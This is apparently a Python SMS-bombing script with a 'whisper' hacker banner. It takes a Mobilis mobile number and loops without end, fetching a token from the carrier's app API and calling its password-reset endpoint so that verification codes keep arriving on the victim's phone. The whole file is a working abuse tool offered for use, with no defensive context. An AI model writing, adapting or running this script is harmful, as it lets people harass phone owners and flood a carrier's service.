import requests,os
E = '\033[1;31m'
B = '\033[2;36m'
G = '\033[1;32m'
S = '\033[1;33m'
os.system('clear')
print(f'''{B}{E}==============================
|{G}[+] GitHub    : {B}whisper-666 |
|{G}[+] InstaGram : {B}_whisper.io_|
|{G}[+] TeleGram  : {B}whisper_io  |
{E}==============================''')
nmbr=('  '+input(f'{S}[+] Mobilis Number ==> {B}')).split('  0')[1]
print(f'{E}==============================')
snt=0
while True:
 head1={
    "Host": "10.70.217.147:8080",
    "Connection": "Keep-Alive",
    "Accept-Encoding": "gzip",
    "User-Agent": "okhttp/3.10.0"}
 token=requests.get('http://10.70.217.147:8080/api/user/generatetoken?channelId\u003dANDROID_NATIVE_APP',headers=head1).json()['body']['jwt']
 head2={
    "Jwt": f"{token}",
    "Content-Type": "application/json; charset\u003dUTF-8",
    "Content-Length": "57",
    "Host": "10.70.217.147:8080",
    "Connection": "Keep-Alive",
    "Accept-Encoding": "gzip",
    "User-Agent": "okhttp/3.10.0"}
 json={"body":{},"header":{"locale":"fr","msisdn":f"{nmbr}"}}
 whisper=requests.post('http://10.70.217.147:8080/api/user/resetpassword/initiate',json=json,headers=head2).json()['header']['responseMessage']
 if whisper == 'The verification code has been sent':
  snt+=1
  print(f'{G}[{snt}] {B}{whisper}')
 else:
  print(f'{E}[×] {whisper}')